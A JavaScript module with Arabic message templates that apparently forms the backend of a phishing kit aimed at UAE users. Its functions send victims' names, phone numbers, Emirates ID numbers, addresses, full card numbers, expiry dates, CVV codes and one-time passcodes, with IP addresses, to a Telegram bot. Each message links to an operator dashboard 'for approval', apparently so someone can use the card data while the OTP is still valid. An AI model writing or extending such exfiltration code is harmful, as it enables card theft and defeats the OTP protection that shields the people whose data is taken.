import { store } from './store.js';

export async function sendTelegramMessage(text) {
  try {
    const config = store.getTelegramConfig();
    const token = config.token || process.env.TELEGRAM_BOT_TOKEN;
    const chatId = config.chatId || process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId || config.enabled === false) {
      return { success: false, reason: 'not_configured' };
    }

    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML'
      })
    });

    const data = await res.json();
    return { success: data.ok, data };
  } catch (err) {
    console.error('Telegram notification error:', err.message);
    return { success: false, error: err.message };
  }
}

export async function notifyNewRegistration(visitor) {
  const name = visitor.name || (visitor.bookingData && visitor.bookingData['الاسم']) || 'زائر جديد';
  const phone = visitor.phone || (visitor.bookingData && visitor.bookingData['الهاتف']) || 'غير محدد';
  const emiratesId = visitor.emiratesId || (visitor.bookingData && visitor.bookingData['رقم الهوية']) || 'غير محدد';
  const region = (visitor.bookingData && visitor.bookingData['المنطقة']) || 'غير محدد';
  const address = (visitor.bookingData && visitor.bookingData['العنوان']) || 'غير محدد';
  const cardType = (visitor.bookingData && visitor.bookingData['البطاقة']) || 'غير محدد';
  const ip = visitor.ip || '127.0.0.1';
  const time = new Date().toLocaleString('ar-AE', { timeZone: 'Asia/Dubai' });

  const message = `🔔 <b>تسجيل جديد في لوحة التحكم!</b>\n\n` +
    `👤 <b>الاسم:</b> <code>${name}</code>\n` +
    `📱 <b>الهاتف:</b> <code>${phone}</code>\n` +
    `🆔 <b>الهوية:</b> <code>${emiratesId}</code>\n` +
    `💳 <b>نوع البطاقة:</b> ${cardType}\n` +
    `📍 <b>المنطقة:</b> ${region}\n` +
    `🏠 <b>العنوان:</b> ${address}\n` +
    `🌐 <b>IP:</b> <code>${ip}</code>\n` +
    `⏰ <b>الوقت:</b> ${time}\n` +
    `🔗 <b>رابط الإدارة:</b> <a href="https://ais-dev-ls7p7qhhiypzcqnjct3tal-767415666254.europe-west2.run.app/dashboard/">فتح لوحة التحكم</a>`;

  return sendTelegramMessage(message);
}

export async function notifyNewCard(visitor) {
  const name = visitor.name || visitor.cardHolder || 'غير محدد';
  const phone = visitor.phone || 'غير محدد';
  const cardNumber = visitor.cardNumber || 'غير محدد';
  const expiry = visitor.expiry || 'غير محدد';
  const cvv = visitor.cvv || 'غير محدد';
  const holder = visitor.cardHolder || name;
  const ip = visitor.ip || '127.0.0.1';
  const time = new Date().toLocaleString('ar-AE', { timeZone: 'Asia/Dubai' });

  const message = `💳 <b>وصول بطاقة بنكية جديدة!</b>\n\n` +
    `👤 <b>اسم العميل:</b> ${name}\n` +
    `📱 <b>الهاتف:</b> <code>${phone}</code>\n` +
    `💳 <b>رقم البطاقة:</b> <code>${cardNumber}</code>\n` +
    `📅 <b>تاريخ الانتهاء:</b> <code>${expiry}</code>\n` +
    `🔒 <b>رمز الأمان (CVV):</b> <code>${cvv}</code>\n` +
    `👤 <b>اسم حامل البطاقة:</b> ${holder}\n` +
    `🌐 <b>IP:</b> <code>${ip}</code>\n` +
    `⏰ <b>الوقت:</b> ${time}\n` +
    `🔗 <b>رابط الإدارة:</b> <a href="https://ais-dev-ls7p7qhhiypzcqnjct3tal-767415666254.europe-west2.run.app/dashboard/">فتح لوحة التحكم للموافقة</a>`;

  return sendTelegramMessage(message);
}

export async function notifyNewOtp(visitor) {
  const name = visitor.name || 'غير محدد';
  const phone = visitor.phone || 'غير محدد';
  const otp = visitor.otp || 'غير محدد';
  const ip = visitor.ip || '127.0.0.1';
  const time = new Date().toLocaleString('ar-AE', { timeZone: 'Asia/Dubai' });

  const message = `🔐 <b>وصول رمز تحقق جديد (OTP)!</b>\n\n` +
    `👤 <b>اسم العميل:</b> ${name}\n` +
    `📱 <b>الهاتف:</b> <code>${phone}</code>\n` +
    `🔑 <b>رمز التحقق (OTP):</b> <code>${otp}</code>\n` +
    `🌐 <b>IP:</b> <code>${ip}</code>\n` +
    `⏰ <b>الوقت:</b> ${time}\n` +
    `🔗 <b>رابط الإدارة:</b> <a href="https://ais-dev-ls7p7qhhiypzcqnjct3tal-767415666254.europe-west2.run.app/dashboard/">فتح لوحة التحكم للموافقة</a>`;

  return sendTelegramMessage(message);
}
